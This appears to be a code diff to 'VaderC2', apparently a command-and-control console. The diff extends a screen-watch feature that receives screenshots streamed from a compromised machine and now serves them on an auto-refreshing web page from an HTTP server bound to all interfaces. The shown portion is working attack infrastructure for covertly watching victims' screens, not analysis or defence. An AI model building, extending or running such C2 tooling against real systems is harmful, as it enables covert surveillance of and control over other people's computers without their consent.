@@ -784,31 +784,63 @@ class VaderC2:
                             my_ip = "192.168.1.92"
 
                         recv_port = 8891
+                        view_port = 8892
                         ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
                         os.makedirs(ss_dir, exist_ok=True)
                         latest_path = os.path.join(ss_dir, "latest.png")
 
-                        viewer_path = os.path.join(ss_dir, "live.html")
-                        with open(viewer_path, "w") as vf:
-                            vf.write(f"""<!DOCTYPE html>
+                        from http.server import HTTPServer, BaseHTTPRequestHandler
+
+                        LIVE_HTML = f"""<!DOCTYPE html>
 <html><head><title>CHEYANNE — Live Screen</title>
-<style>body{{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh}}
-img{{max-width:100vw;max-height:100vh;object-fit:contain}}</style></head>
-<body><img id="s" src="latest.png"><script>
-setInterval(()=>{{document.getElementById('s').src='latest.png?t='+Date.now()}},{interval*1000});
-</script></body></html>""")
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}}
+img{{max-width:100vw;max-height:100vh;object-fit:contain}}
+#hud{{position:fixed;top:8px;left:8px;color:#0f0;font:12px monospace;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;z-index:9}}</style></head>
+<body><div id="hud">LIVE</div><img id="s" src="/latest.png"><script>
+var f=0;setInterval(function(){{f++;var i=document.getElementById('s');i.src='/latest.png?t='+Date.now();document.getElementById('hud').textContent='LIVE ['+f+']'}},{interval*1000});
+</script></body></html>"""
+
+                        class _ViewHandler(BaseHTTPRequestHandler):
+                            def do_GET(self):
+                                if self.path == "/" or self.path.startswith("/index"):
+                                    body = LIVE_HTML.encode("utf-8")
+                                    self.send_response(200)
+                                    self.send_header("Content-Type", "text/html")
+                                    self.send_header("Content-Length", str(len(body)))
+                                    self.end_headers()
+                                    self.wfile.write(body)
+                                elif self.path.startswith("/latest.png"):
+                                    if os.path.exists(latest_path):
+                                        with open(latest_path, "rb") as f:
+                                            data = f.read()
+                                        self.send_response(200)
+                                        self.send_header("Content-Type", "image/png")
+                                        self.send_header("Content-Length", str(len(data)))
+                                        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+                                        self.end_headers()
+                                        self.wfile.write(data)
+                                    else:
+                                        self.send_response(204)
+                                        self.end_headers()
+                                else:
+                                    self.send_response(404)
+                                    self.end_headers()
+                            def log_message(self, *a):
+                                pass
+
+                        view_srv = HTTPServer(("0.0.0.0", view_port), _ViewHandler)
+                        view_thread = threading.Thread(target=view_srv.serve_forever, daemon=True)
+                        view_thread.start()
 
                         try:
-                            import subprocess as _sp
                             import webbrowser
-                            webbrowser.open(viewer_path)
+                            webbrowser.open(f"http://127.0.0.1:{view_port}")
                         except Exception:
                             pass
 
-                        print(f"  {GREEN}[+] Live viewer opened — refreshes every {interval}s{RST}")
+                        print(f"  {GREEN}[+] Live viewer: http://0.0.0.0:{view_port} — refreshes every {interval}s{RST}")
                         print(f"  {AMBER}[*] Streaming screen from {matches[0][:8]}... Ctrl+C to stop{RST}")
-
-                        from http.server import HTTPServer, BaseHTTPRequestHandler
 
                         class _ScreenHandler(BaseHTTPRequestHandler):
                             def do_POST(self):
@@ -852,6 +884,7 @@ setInterval(()=>{{document.getElementById('s').src='latest.png?t='+Date.now()}},
                             print(f"\n  {AMBER}[*] Watch stopped — {frame} frames captured{RST}")
                         finally:
                             srv.server_close()
+                            view_srv.shutdown()
 
                 elif cmd == "kill":
                     if not args:
